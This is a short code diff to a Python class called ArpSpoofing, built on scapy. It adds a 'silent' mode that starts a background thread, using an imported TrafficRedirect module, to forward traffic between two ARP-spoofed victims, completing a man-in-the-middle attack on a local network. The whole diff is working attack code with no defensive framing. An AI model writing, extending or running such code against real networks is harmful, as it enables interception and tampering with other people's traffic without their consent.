@@ -1,6 +1,7 @@
 import sys
 import time
 from scapy.all import *
+from TrafficRedirect import TrafficRedirect
 
 class ArpSpoofing():
     interface = 0
@@ -51,6 +52,18 @@ class ArpSpoofing():
             for item in packetList:
                 sendp(item, iface=self.interface, verbose=False)
             print("Spoof Spoof")
+            if silent==True:
+                redirecting = TrafficRedirect(self.interface)
+                try:
+                    print("before thread")
+                    redirect = threading.Thread(name="redirectThread", target=redirecting.doRedirect, args=(
+                    target1, target2, target1MAC, target2MAC))
+                    redirect.daemon = True
+                    redirect.start()
+                    print("after thread")
+                except:
+                    print("Thread arp failed to start")
+
             time.sleep(timeSleep)
 
 
